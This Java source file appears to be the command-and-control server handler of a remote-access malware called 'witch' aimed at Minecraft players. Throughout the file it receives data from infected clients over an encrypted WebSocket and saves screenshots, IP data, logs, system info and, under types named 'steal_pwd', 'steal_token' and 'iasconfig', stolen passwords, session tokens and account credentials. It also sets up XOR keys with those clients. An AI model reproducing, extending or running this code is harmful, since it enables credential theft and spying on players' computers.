package me.soda.witch.server.handlers;

import com.google.gson.Gson;
import com.google.gson.JsonObject;
import me.soda.witch.server.server.Server;
import me.soda.witch.shared.FileUtil;
import me.soda.witch.shared.HandleMessage;
import me.soda.witch.shared.Info;
import me.soda.witch.shared.Message;
import org.java_websocket.WebSocket;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class MessageHandler {
    private static final Gson GSON = new Gson();

    public static void handleRaw(byte[] bytes, WebSocket conn, Server server) {
        try {
            handle(server.clientMap.get(conn).decrypt(bytes), conn, server);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void handle(Message message, WebSocket conn, Server server) {
        HandleMessage.handle(message, (msgType, msg) -> {
            Info info = server.clientMap.get(conn);
            int id = info.index;
            server.log("* Received message: " + msgType + " From ID " + id);
            try {
                switch (msgType) {
                    case "screenshot" -> {
                        File file = new File("data/screenshots", getFileName("id", "png", String.valueOf(id), true));
                        FileUtil.write(file, (byte[]) msg[0]);
                    }
                    case "skin" -> {
                        String playerName = info.playerData.get("playerName").getAsString();
                        File file = new File("data/skins", getFileName(playerName, "png", String.valueOf(id), false));
                        FileUtil.write(file, (byte[]) msg[0]);
                    }
                    case "logging" -> {
                        File file = new File("data/logging", getFileName("id", "log", String.valueOf(id), false));
                        String oldInfo = new String(FileUtil.read(file), StandardCharsets.UTF_8);
                        FileUtil.write(file, (oldInfo + msg[0]).getBytes(StandardCharsets.UTF_8));
                    }
                    case "player" -> info.playerData = GSON.fromJson((String) msg[0], JsonObject.class);
                    case "ip" -> info.ip = GSON.fromJson((String) msg[0], JsonObject.class);
                    case "steal_pwd", "steal_token", "iasconfig", "runargs", "systeminfo", "props" -> {
                        String ext = msgType.equals("systeminfo") ? "txt" : "json";
                        File file = new File("data/data", getFileName(msgType, ext, info.playerData.get("playerName").getAsString(), true));
                        FileUtil.write(file, GSON.toJson(msg[0]));
                    }
                    case "server_name" -> server.sendUtil.trySend(conn, server, msgType, server.name);
                    case "key" -> {
                        server.sendUtil.trySend(conn, server, msgType, info.randomXOR());
                        info.acceptXOR = true;
                    }
                    default -> server.log("Message: " + msgType + " " + msg[0]);
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    private static String getFileName(String prefix, String suffix, String afterPrefix, boolean time) {
        return String.format("%s-%s%s.%s", prefix, afterPrefix, time ? LocalDateTime.now().format(DateTimeFormatter.ofPattern("-MM-dd-HH-mm-ss")) : "", suffix);
    }
}
